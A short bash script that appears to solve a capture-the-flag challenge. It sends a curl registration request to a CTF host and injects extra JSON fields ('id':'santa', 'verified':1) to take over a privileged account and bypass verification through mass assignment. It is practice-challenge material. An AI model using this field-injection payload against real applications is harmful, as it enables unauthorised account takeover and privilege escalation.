#!/bin/bash
username="santa"                                                  
password="santa123"
curl -k -v -L -D response_headers.txt -o response_body.txt -c cookies.txt \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$username\",\"password\":\"$password\",\"id\":\"santa\",\"verified\":1}" \
  https://0ac760404670fe4a.julec.tf/api/workshop/register
echo "username=$username password=$password"